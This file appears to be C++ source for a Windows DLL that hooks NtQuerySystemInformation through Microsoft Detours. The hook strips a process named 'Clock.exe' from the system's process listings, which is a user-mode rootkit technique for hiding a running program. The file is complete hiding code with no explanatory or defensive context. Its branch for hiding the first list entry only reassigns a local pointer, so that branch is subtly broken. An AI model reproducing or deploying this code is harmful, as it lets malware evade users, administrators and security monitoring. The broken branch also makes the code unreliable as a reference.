#include <Windows.h>
#include "detours.h"
#include <winternl.h>
#include <wchar.h>
#pragma comment(lib, "detours.lib")

typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

NtQuerySystemInformation_t TrueNtQuerySystemInformation = nullptr;

NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
)
{
    NTSTATUS status = TrueNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    if (status != 0 || SystemInformationClass != SystemProcessInformation)
        return status;

    PSYSTEM_PROCESS_INFORMATION prev = nullptr;
    PSYSTEM_PROCESS_INFORMATION curr = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

    while (true) {
        UNICODE_STRING* name = &curr->ImageName;
        if (name->Buffer && _wcsicmp(name->Buffer, L"Clock.exe") == 0) {
            if (prev) {
                if (curr->NextEntryOffset)
                    prev->NextEntryOffset += curr->NextEntryOffset;
                else
                    prev->NextEntryOffset = 0;
            }
            else {
                if (curr->NextEntryOffset)
                    (BYTE*&)SystemInformation = (BYTE*)curr + curr->NextEntryOffset;
                else
                    SystemInformation = nullptr;
            }
        }
        else {
            prev = curr;
        }

        if (!curr->NextEntryOffset)
            break;
        curr = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)curr + curr->NextEntryOffset);
    }

    return status;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        TrueNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)TrueNtQuerySystemInformation, HookedNtQuerySystemInformation);
        DetourTransactionCommit();
        break;
    case DLL_PROCESS_DETACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)TrueNtQuerySystemInformation, HookedNtQuerySystemInformation);
        DetourTransactionCommit();
        break;
    }
    return TRUE;
}
